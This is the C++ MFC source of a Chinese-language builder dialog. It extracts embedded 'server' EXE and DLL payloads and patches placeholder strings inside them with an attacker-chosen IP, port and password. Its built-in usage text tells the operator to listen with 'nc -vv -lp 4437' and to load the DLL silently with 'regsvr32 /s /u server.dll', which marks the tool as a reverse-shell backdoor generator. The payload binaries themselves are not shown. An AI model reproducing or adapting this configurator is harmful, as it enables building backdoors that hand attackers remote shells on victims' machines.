
// MFC配置端Dlg.cpp : 实现文件
//

#include "stdafx.h"
#include "MFC配置端.h"
#include "MFC配置端Dlg.h"
#include "afxdialogex.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CMFC配置端Dlg 对话框



CMFC配置端Dlg::CMFC配置端Dlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(IDD_MFC_DIALOG, pParent)
	, m_szIpStr(_T("127.0.0.1"))
	, m_szPortStr(_T("4437"))
	, m_szOtherStr(_T("123456"))
	, m_usage_method(_T("EXE使用：\r\nNC监听端口，直接运行\r\nDLL使用：\r\nnc -vv -lp 4437\r\nregsvr32 /s /u server.dll"))
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CMFC配置端Dlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDIT2, m_szIpStr);
	DDX_Text(pDX, IDC_szPort, m_szPortStr);
	DDX_Text(pDX, IDC_szOther, m_szOtherStr);
	DDX_Text(pDX, IDC_EDIT1, m_usage_method);
}

BEGIN_MESSAGE_MAP(CMFC配置端Dlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDOK, &CMFC配置端Dlg::OnBnClickedOk)
	ON_BN_CLICKED(IDC_BUTTON2, &CMFC配置端Dlg::OnBnChangeResource)
	ON_BN_CLICKED(IDC_BUTTON3, &CMFC配置端Dlg::OnBuild_DLL)
	ON_BN_CLICKED(IDC_BUTTON4, &CMFC配置端Dlg::Builx64EXE)
	ON_BN_CLICKED(IDC_BUTTON5, &CMFC配置端Dlg::Builx64DLL)
END_MESSAGE_MAP()


// CMFC配置端Dlg 消息处理程序

BOOL CMFC配置端Dlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CMFC配置端Dlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CMFC配置端Dlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CMFC配置端Dlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CMFC配置端Dlg::OnBnClickedOk()
{
	// TODO: 在此添加控件通知处理程序代码
	CDialogEx::OnOK();
}


void CMFC配置端Dlg::OnBnChangePE()
{
	// TODO: 在此添加控件通知处理程序代码
	UpdateData(true);

	BOOL bRet = false;     // 打开状态标志
	TCHAR * pFileData;     // 文件流内容
	DWORD d_FileSize;      // 文件大小



	// 读出文件内容并写入  
	HANDLE hFile = CreateFile(strResult, GENERIC_READ, 0, NULL, OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL, NULL);

	d_FileSize = GetFileSize(hFile, NULL);
	pFileData = new TCHAR[d_FileSize + 1];

	bRet = ReadFile(hFile, pFileData, d_FileSize, &d_FileSize, NULL);
	if (0 == bRet)
	{
		return;
	}

	// 替换目标可执行文件中的指定信息:IP port 以及其他的信息  
	TCHAR szIpStr[] =    L"AAAAAAAAAAAAAAAAAAAAAAAAAAAA";
	TCHAR szPortStr[] =  L"BBBBBBBBBBBBBBBBBBBBBBBBBBBB";
	TCHAR szOtherStr[] = L"CCCCCCCCCCCCCCCCCCCCCCCCCCCC";

	TCHAR * pDst;
	int i = 0;

	// 处理IP字符串  
	while (true)
	{
		if (wcscmp(szIpStr, pFileData + i) == 0)
		{
			break;
		}
		else
		{
			i++;
		}
	}

	// 找到IP地址字符串对应的地址偏移
	pDst = pFileData + i;

	//CString转char 将原先的AAAAA...替换成现在我们要设定的IP地址
	wmemset(pDst, 0, wcslen(szIpStr)+1);                       // 清空原先AAAA字符串
	wmemcpy(pDst, m_szIpStr, m_szIpStr.GetLength() + 1);       // 把设定的IP字符串复制到内存中

	// 处理端口字符串  
	while (true)
	{
		if (wcscmp(szPortStr, pFileData + i) == 0)
		{
			break;
		}
		else
		{
			i++;
		}
	}
	pDst = pFileData + i;
	//CString转char 将原先的BBBBB...替换成现在我们要设定的IP地址
	wmemset(pDst, 0, wcslen(szPortStr) + 1);                       // 清空原先BBBB字符串
	wmemcpy(pDst, m_szPortStr, m_szPortStr.GetLength() + 1);       // 把设定的端口字符串复制到内存中

	// 处理其他信息字符串
	while (true)
	{
		if (wcscmp(szOtherStr, pFileData + i) == 0)
		{
			break;
		}
		else
		{
			i++;
		}
	}
	pDst = pFileData + i;
	//CString转char 将原先的BBBBB...替换成现在我们要设定的IP地址
	wmemset(pDst, 0, wcslen(szOtherStr) + 1);                      // 清空原先CCCCC字符串
	wmemcpy(pDst, m_szOtherStr, m_szOtherStr.GetLength() + 1);     // 把设定的端口字符串复制到内存中




	// 释放修改后的文件
	HANDLE hFile_;

	switch (BuildFlag)
	{
	case 1: 
	{
		// 释放修改后的EXE文件
		hFile_ = CreateFile(strPath + "server.exe", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS,
			FILE_ATTRIBUTE_NORMAL, NULL);  // 配置信息
	}break;
	case 2: {
		// 释放修改后的EXE文件
		hFile_ = CreateFile(strPath + "server.dll", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS,
			FILE_ATTRIBUTE_NORMAL, NULL);  // 配置信息
	
	}break;
	case 3: {
		// 释放修改后的EXE文件
		hFile_ = CreateFile(strPath + "server_x64.exe", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS,
			FILE_ATTRIBUTE_NORMAL, NULL);  // 配置信息
	
	}break;
	case 4: {
	
		// 释放修改后的EXE文件
		hFile_ = CreateFile(strPath + "server_x64.dll", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS,
			FILE_ATTRIBUTE_NORMAL, NULL);  // 配置信息

	}break;

	}

	// 写入文件	
	bRet = WriteFile(hFile_, pFileData, d_FileSize, &d_FileSize, NULL);
	if (bRet == 0)
	{
		return;
	}

	// 关闭句柄
	CloseHandle(hFile_);
	delete pFileData;                                              // 删除内容
	CloseHandle(hFile);                                            // 关闭句柄
	DeleteFile(strResult);                                         // 删除原始文件
}


BOOL CMFC配置端Dlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: 在此添加专用代码和/或调用基类
	if (pMsg->message == WM_KEYDOWN && pMsg->wParam == VK_RETURN)
	{
		if (GetFocus()->GetDlgCtrlID() == IDC_szIP)//按下回车，如果当前焦点是在自己期望的控件上
		{
			// 你想做的事，如果按下回车时焦点在你想要的控件上
			OnBnChangePE();
		}
		return TRUE;
	}
	if (pMsg->message == WM_KEYDOWN && pMsg->wParam == VK_ESCAPE)
		return TRUE;
	return CDialogEx::PreTranslateMessage(pMsg);
}


// 生成x86 EXE
void CMFC配置端Dlg::OnBnChangeResource()
{
	// TODO: 在此添加控件通知处理程序代码

	HANDLE hFile;            //释放资源到某个文件中
	BOOL bRet = false;     // 打开状态标志

	// 获得资源句柄
	HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(IDR_EXE1), TEXT("EXE"));

	// 获得资源文件大小
	DWORD dwSize = SizeofResource(NULL, hRsrc);

	// 加载资源文件
	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);

	// 锁定资源并获得指针
	LPVOID pBuffer = LockResource(hGlobal);


	// 清空原来的缓存
	strEXE = _T("");
	strPath = _T("");
	strResult = _T("");

	// 获得要保存的PE文件路径
	TCHAR _szPath[MAX_PATH + 1] = { 0 };
	GetModuleFileName(NULL, _szPath, MAX_PATH);
	(_tcsrchr(_szPath, _T('\\')))[1] = 0;//删除文件名，只获得路径 字串

	for (int n = 0; _szPath[n]; n++)
	{
		if (_szPath[n] != _T('\\'))
		{
			strPath += _szPath[n];
		}
		else
		{
			strPath += _T("\\\\");
		}
	}

	// 配置自身资源释放文件的位置
	strEXE = "server.tmp";
	strResult = strPath+strEXE;

	// 删除原来的文件
	DeleteFile(strResult);
	DeleteFile(strPath+"server.exe");


	// 新建文件
	hFile = CreateFile(strResult, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, NULL);

	// 写入文件
	bRet = WriteFile(hFile, pBuffer, dwSize, &dwSize, NULL);
	if (bRet == 0)
	{
		return;
	}
	// 关闭句柄
	CloseHandle(hFile);
	// 生成EXE标识
	BuildFlag = 1;
	// 修改PE函数
	OnBnChangePE();

}

// 生成x86 DLL
void CMFC配置端Dlg::OnBuild_DLL()
{
	// TODO: 在此添加控件通知处理程序代码
	HANDLE hFile;            //释放资源到某个文件中
	BOOL bRet = false;       // 打开状态标志
	
	// 获得资源句柄
	HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(IDR_DLL1), TEXT("DLL"));

	// 获得资源文件大小
	DWORD dwSize = SizeofResource(NULL, hRsrc);

	// 加载资源文件
	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);

	// 锁定资源并获得指针
	LPVOID pBuffer = LockResource(hGlobal);


	// 清空原来的缓存
	strEXE = _T("");
	strPath = _T("");
	strResult = _T("");

	// 获得要保存的PE文件路径
	TCHAR _szPath[MAX_PATH + 1] = { 0 };
	GetModuleFileName(NULL, _szPath, MAX_PATH);
	(_tcsrchr(_szPath, _T('\\')))[1] = 0;//删除文件名，只获得路径 字串

	for (int n = 0; _szPath[n]; n++)
	{
		if (_szPath[n] != _T('\\'))
		{
			strPath += _szPath[n];
		}
		else
		{
			strPath += _T("\\\\");
		}
	}

	// 配置自身资源释放文件的位置
	strEXE = "server.tmp";
	strResult = strPath + strEXE;

	// 删除原来的文件
	DeleteFile(strResult);
	DeleteFile(strPath + "server.dll");

	// 新建文件
	hFile = CreateFile(strResult, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, NULL);

	// 写入文件
	bRet = WriteFile(hFile, pBuffer, dwSize, &dwSize, NULL);
	if (bRet == 0)
	{
		return;
	}
	// 关闭句柄
	CloseHandle(hFile);
	// 生成DLL标识
	BuildFlag = 2;

	// 修改PE函数
	OnBnChangePE();
}

// 生成x64 EXE
void CMFC配置端Dlg::Builx64EXE()
{
	// TODO: 在此添加控件通知处理程序代码

	HANDLE hFile;            //释放资源到某个文件中
	BOOL bRet = false;     // 打开状态标志

						   // 获得资源句柄
	HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(IDR_X64_EXE1), TEXT("x64_EXE"));

	// 获得资源文件大小
	DWORD dwSize = SizeofResource(NULL, hRsrc);

	// 加载资源文件
	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);

	// 锁定资源并获得指针
	LPVOID pBuffer = LockResource(hGlobal);


	// 清空原来的缓存
	strEXE = _T("");
	strPath = _T("");
	strResult = _T("");

	// 获得要保存的PE文件路径
	TCHAR _szPath[MAX_PATH + 1] = { 0 };
	GetModuleFileName(NULL, _szPath, MAX_PATH);
	(_tcsrchr(_szPath, _T('\\')))[1] = 0;//删除文件名，只获得路径 字串

	for (int n = 0; _szPath[n]; n++)
	{
		if (_szPath[n] != _T('\\'))
		{
			strPath += _szPath[n];
		}
		else
		{
			strPath += _T("\\\\");
		}
	}

	// 配置自身资源释放文件的位置
	strEXE = "server.tmp";
	strResult = strPath + strEXE;

	// 删除原来的文件
	DeleteFile(strResult);
	DeleteFile(strPath + "server_x64.exe");


	// 新建文件
	hFile = CreateFile(strResult, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, NULL);

	// 写入文件
	bRet = WriteFile(hFile, pBuffer, dwSize, &dwSize, NULL);
	if (bRet == 0)
	{
		return;
	}
	// 关闭句柄
	CloseHandle(hFile);
	// 生成EXE标识
	BuildFlag = 3;
	// 修改PE函数
	OnBnChangePE();
}

// 生成x64 DLL
void CMFC配置端Dlg::Builx64DLL()
{
	// TODO: 在此添加控件通知处理程序代码

	HANDLE hFile;            //释放资源到某个文件中
	BOOL bRet = false;     // 打开状态标志

						   // 获得资源句柄
	HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(IDR_X64_DLL1), TEXT("x64_DLL"));

	// 获得资源文件大小
	DWORD dwSize = SizeofResource(NULL, hRsrc);

	// 加载资源文件
	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);

	// 锁定资源并获得指针
	LPVOID pBuffer = LockResource(hGlobal);


	// 清空原来的缓存
	strEXE = _T("");
	strPath = _T("");
	strResult = _T("");

	// 获得要保存的PE文件路径
	TCHAR _szPath[MAX_PATH + 1] = { 0 };
	GetModuleFileName(NULL, _szPath, MAX_PATH);
	(_tcsrchr(_szPath, _T('\\')))[1] = 0;//删除文件名，只获得路径 字串

	for (int n = 0; _szPath[n]; n++)
	{
		if (_szPath[n] != _T('\\'))
		{
			strPath += _szPath[n];
		}
		else
		{
			strPath += _T("\\\\");
		}
	}

	// 配置自身资源释放文件的位置
	strEXE = "server.tmp";
	strResult = strPath + strEXE;

	// 删除原来的文件
	DeleteFile(strResult);
	DeleteFile(strPath + "server_x64.dll");


	// 新建文件
	hFile = CreateFile(strResult, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, NULL);

	// 写入文件
	bRet = WriteFile(hFile, pBuffer, dwSize, &dwSize, NULL);
	if (bRet == 0)
	{
		return;
	}
	// 关闭句柄
	CloseHandle(hFile);
	// 生成EXE标识
	BuildFlag = 4;
	// 修改PE函数
	OnBnChangePE();
}
